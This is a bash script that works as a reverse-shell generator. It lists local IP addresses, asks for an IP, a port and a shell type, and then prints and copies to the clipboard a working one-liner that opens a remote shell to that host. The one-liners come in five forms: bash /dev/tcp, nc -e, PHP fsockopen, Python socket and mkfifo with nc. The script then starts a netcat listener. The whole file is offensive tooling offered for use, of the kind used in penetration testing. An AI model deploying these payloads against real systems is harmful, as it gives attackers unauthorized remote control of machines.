#!/bin/bash

# Author: Tky

#Reverse shells from pentestmonkey.net

#If you want to use it anywhere on the system, create a soft link.
#ln -s /PATH-TO-FOLDER/makeRS.sh /usr/local/bin/

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${YELLOW}Exiting...${RESET}"
	rm /tmp/ips
	exit 0
}

RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
RESET='\033[0m'


#Interfaces
interfaces(){
	ips= $(ip addr show | grep "inet\b" | awk '{print $2}' | cut -d/ -f1 > /tmp/ips);

	for ips in $(cat /tmp/ips); do
		echo -e "[${YELLOW}#${RESET}]" $ips
	done
}

#ReverseShells
bashRS(){
	echo "bash -i >& /dev/tcp/"$ipRS"/"$portRS "0>&1" | tr -d '\n' |xclip -sel clip
	echo "bash -i >& /dev/tcp/"$ipRS"/"$portRS "0>&1"
}

phpRS(){
	echo "php -r '"\$"sock=fsockopen(\""$ipRS"\",$portRS);exec("\"/bin/sh -i "<""&"3 ">""&""3" "2>""&""3"""\"");'" |  tr -d '\n' |xclip -sel clip
	echo "php -r '"\$"sock=fsockopen(\""$ipRS"\",$portRS);exec("\"/bin/sh -i "<""&"3 ">""&""3" "2>""&""3"""\"");'"
}

ncRS(){
	echo "nc -e /bin/sh" $ipRS $portRS | tr -d '\n' |xclip -sel clip
	echo "nc -e /bin/sh" $ipRS $portRS
}

pyRS(){
	echo  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"'$ipRS'"'",$portRS));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'" | tr -d '\n' |xclip -sel clip
	echo  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"'$ipRS'"'",$portRS));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\""/bin/sh"\"","\""-i"\""]);'"
}

ncrmRS(){
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ipRS $portRS >/tmp/f" | tr -d '\n' |xclip -sel clip
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ipRS $portRS >/tmp/f"

}


#Main

#Banner
echo -e "${RED} ------------------------${RESET}"
echo -e "${RED}|${YELLOW}CREATING A REVERSE SHELL${RED}| ${RESET}"
echo -e "${RED} ------------------------${RESET}"

interfaces
printf "\n[${YELLOW}*${RESET}] Enter your IP: "
read ipRS
printf "[${YELLOW}*${RESET}] Enter your PORT: "
read portRS
printf "[${YELLOW}*${RESET}] What Reverse Shell do you want?\n\n[${BLUE}1${RESET}]-Bash\n[${BLUE}2${RESET}]-Netcat\n[${BLUE}3${RESET}]-Php\n[${BLUE}4${RESET}]-Python\n[${BLUE}5${RESET}]-NetCat WrongVersion\n\n"
echo -n "Enter nº: "
read typeRS
printf "\n[${RED}!${RESET}]${YELLOW} Your Reverse-Shell has been copied to the clipboard${RESET}\n\n"

case $typeRS in 
	1)
		bashRS
	;;
	2)
		ncRS
	;;
	3)
		phpRS
	;;
	4) 	pyRS
	;;
	5)	ncrmRS
	;;
	*)
		echo "expecting a number..."
	;;
esac
echo "\n"
nc -lvnp $portRS
rm /tmp/ips
